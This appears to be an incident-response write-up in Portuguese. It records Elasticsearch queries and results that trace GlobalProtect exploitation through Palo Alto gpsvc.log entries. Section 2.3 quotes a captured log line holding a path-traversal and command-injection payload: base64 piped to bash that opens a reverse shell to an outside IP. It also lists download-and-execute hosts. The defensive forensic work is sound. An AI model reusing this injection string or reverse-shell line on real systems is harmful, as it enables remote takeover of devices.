# Phase 02 — gpsvc.log & primeiros indícios (comando + resultado + análise)

## 2.1 gpsvc presence (sample)
**Comando (DevTools):**
```http
GET paloalto-linux-messages-*/_search
{
  "size": 3,
  "track_total_hits": true,
  "_source": ["@timestamp","log.file.path","message","event.original"],
  "query": {
    "bool": {
      "should": [
        { "match_phrase": { "log.file.path": "gpsvc.log" } },
        { "query_string": { "default_field": "log.file.path", "query": "*gpsvc.log" } }
      ],
      "minimum_should_match": 1
    }
  },
  "sort": [{ "@timestamp": "asc" }]
}
Resultado (resumo): hits.total.value = 2014
Amostra real (3 hits):

json
Copiar código
{
  "took": 5,
  "hits": {
    "total": { "value": 2014, "relation": "eq" },
    "hits": [
      {
        "_source": {
          "log": { "file": { "path": "/mnt/palo_alto2/var/log/pan/gpsvc.log" } },
          "message": "{\"level\":\"info\",\"time\":\"2024-04-21T08:06:32.124890099-07:00\",\"message\":\"============= Start gpsvc... =============\"}",
          "@timestamp": "2024-04-26T17:58:01.306455127Z"
        }
      },
      { "_source": { "log": { "file": { "path": "/mnt/palo_alto2/var/log/pan/gpsvc.log" } },
        "message": "{\"level\":\"info\",\"time\":\"2024-04-21T08:06:32.124997885-07:00\",\"message\":\"[Version]: 3.pan\"}",
        "@timestamp": "2024-04-26T17:58:01.306503911Z" } },
      { "_source": { "log": { "file": { "path": "/mnt/palo_alto2/var/log/pan/gpsvc.log" } },
        "message": "{\"level\":\"info\",\"time\":\"2024-04-21T08:06:32.125014261-07:00\",\"message\":\"[Git Version]: ca0660bda21\"}",
        "@timestamp": "2024-04-26T17:58:01.306516998Z" } }
    ]
  }
}
Análise: fonte gpsvc.log confirmada e volumosa — local típico dos erros de sessão ligados a exploração do GlobalProtect.

2.2 gpsvc count
Comando (DevTools):

http
Copiar código
GET paloalto-linux-messages-*/_count
{
  "query": {
    "bool": {
      "should": [
        { "match_phrase": { "log.file.path": "gpsvc.log" } },
        { "query_string": { "default_field": "log.file.path", "query": "*gpsvc.log" } }
      ],
      "minimum_should_match": 1
    }
  }
}
Resultado (real):

json
Copiar código
{
  "count": 2014,
  "_shards": { "total": 1, "successful": 1, "skipped": 0, "failed": 0 }
}
Análise: confirma o volume total de eventos em gpsvc.log no período ingestão do índice.

2.3 "failed to unmarshal session" (IOC chave)
Comando (DevTools):

http
Copiar código
GET paloalto-linux-messages-*/_search
{
  "size": 20,
  "track_total_hits": true,
  "_source": ["@timestamp","log.file.path","message","event.original"],
  "query": {
    "query_string": {
      "query": "message:\"failed to unmarshal session\" OR event.original:\"failed to unmarshal session\""
    }
  },
  "sort": [{ "@timestamp": "asc" }]
}
Resultado (recorte real): hits.total.value = 101

json
Copiar código
{
  "hits": {
    "total": { "value": 101, "relation": "eq" },
    "hits": [
      {
        "_source": {
          "log": { "file": { "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log" } },
          "message": "{\"level\":\"error\",\"task\":\"9-22\",\"time\":\"2024-04-21T22:20:27.58-07:00\",\"message\":\"failed to unmarshal session(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF\"}",
          "@timestamp": "2024-04-26T17:58:42.868Z"
        }
      }
      /* ...demais hits no arquivo results/phase02/search_unmarshal_session.json */
    ]
  }
}
Análise: os erros mostram:

Path traversal para sslvpndocs/device_telemetry;

Execução de comandos via backticks + echo <base64> | bash;

Pós-execução: reverse shell (/dev/tcp/54.162.164.22/1337) e download/exec (185.196.9.31:8080, 138.197.162.79:65534).

Arquivos-verdade no repo:

results/phase02/search_gpsvc_sample.json

results/phase02/count_gpsvc.json

results/phase02/search_unmarshal_session.json
